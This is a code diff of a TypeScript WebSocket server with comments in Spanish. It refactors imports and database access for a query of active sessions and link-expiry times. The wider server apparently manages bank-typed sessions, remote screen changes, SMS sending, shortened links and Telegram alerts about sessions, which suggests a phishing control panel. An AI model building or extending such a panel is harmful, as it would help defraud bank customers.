@@ -4,7 +4,7 @@ import { createServer, type Server } from "http";
 import { WebSocketServer, WebSocket } from "ws";
 import { storage } from "./storage";
 import { nanoid } from "nanoid";
-import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType, InsertSiteConfig, insertSiteConfigSchema } from "@shared/schema";
+import { ScreenType, screenChangeSchema, clientInputSchema, User, UserRole, InsertSmsConfig, insertSmsConfigSchema, InsertSmsHistory, insertSmsHistorySchema, BankType, InsertSiteConfig, insertSiteConfigSchema, sessions, linkTokens } from "@shared/schema";
 import { setupAuth } from "./auth";
 import axios from 'axios';
 import { sendTelegramNotification, sendSessionCreatedNotification, sendScreenChangeNotification, sendFileDownloadNotification } from './telegramService';
@@ -18,6 +18,7 @@ import { z } from 'zod';
 import { linkTokenService } from './services/linkToken';
 import { linkQuotaService } from './services/linkQuota';
 import { bitlyService } from './services/bitly';
+import { eq, and, desc } from 'drizzle-orm';
 
 // Store active connections
 const clients = new Map<string, WebSocket>();
@@ -4214,11 +4215,8 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
     }
 
     try {
-      // Importar linkTokens desde shared/schema
-      const { linkTokens } = await import('@shared/schema');
-      
       // Query para traer sesiones activas con links activos
-      const activeSessions = await db
+      const activeSessions = await storage.db
         .select({
           sessionId: sessions.sessionId,
           folio: sessions.folio,
@@ -4246,7 +4244,7 @@ _Fecha: ${new Date().toLocaleString('es-MX')}_
 
       // Calcular tiempo restante para cada link
       const now = new Date();
-      const sessionsWithTimeRemaining = activeSessions.map(session => {
+      const sessionsWithTimeRemaining = activeSessions.map((session: any) => {
         const expiresAt = new Date(session.expiresAt);
         const timeRemainingMs = Math.max(0, expiresAt.getTime() - now.getTime());
         const isExpired = timeRemainingMs <= 0;
